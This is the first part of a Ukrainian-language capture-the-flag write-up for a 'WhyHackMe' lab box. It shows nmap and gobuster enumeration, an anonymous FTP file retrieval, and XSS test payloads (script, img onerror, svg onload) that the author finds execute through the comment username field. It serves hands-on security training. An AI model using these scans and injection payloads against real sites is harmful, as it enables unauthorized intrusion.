
# WhyHackMe - Dive into the depths of security and analysis with WhyHackMe.

Складність: Medium

Ціль:

## 1. Розвідка (Reconnaissance & Enumeration)

### 1.1. Сканування портів (Nmap):

```bash
└─$ sudo nmap -sV -sC -oN nmap_scan.txt 10.113.143.191
```

![nmap](./img/nmap.png)

```bash
└─$ ftp 10.113.143.191
ftp> ls -lah
229 Entering Extended Passive Mode (|||14935|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        119          4096 Mar 14  2023 .
drwxr-xr-x    2 0        119          4096 Mar 14  2023 ..
-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
226 Directory send OK.
ftp> get update.txt
...
└─$ cat update.txt 
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 
- admin
```

```bash
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -u http://10.113.143.191/ -k -t 50 -x html,txt,php
```

![gobuster](./img/gobuster.png)

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
```

```svg
<svg onload=alert(1)>
```

![comments_xss_test](./img/comments_xss_test.png)

![comments_xss_test_html](./img/comments_xss_test_html.png)

У коментарях фільтруються символи `<` та `>`. Перевіряємо далі ім'я користувача 

![name_xss_test_1](./img/name_xss_test_1.PNG)

Після надсилання коментаря, відпраював XSS.

![name_xss_test_2](./img/name_xss_test_2.PNG)

![name_xss_test_html](./img/name_xss_test_html.PNG)
